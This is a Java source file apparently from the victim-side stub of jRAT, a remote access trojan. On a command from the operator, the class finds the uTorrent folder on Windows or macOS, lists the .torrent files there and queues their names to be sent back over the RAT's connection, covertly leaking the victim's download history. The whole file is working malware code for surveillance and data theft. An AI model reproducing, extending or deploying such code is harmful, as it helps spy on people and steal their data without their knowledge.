package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet40UTorrentDownload;

import java.io.File;

import com.redpois0n.oslib.OperatingSystem;


public class Packet57UTorrentDownloads extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		File dir = null;
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			dir = new File(System.getenv("APPDATA") + "\\uTorrent\\");
		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
			dir = new File(System.getProperty("user.home") + "/Library/Application Support/uTorrent/");
		}

		if (dir != null && dir.exists()) {
			File[] files = dir.listFiles();
			for (File file : files) {
				if (file.getName().toLowerCase().endsWith(".torrent")) {
					con.addToSendQueue(new Packet40UTorrentDownload(file.getName()));
				}
			}
		}
	}

}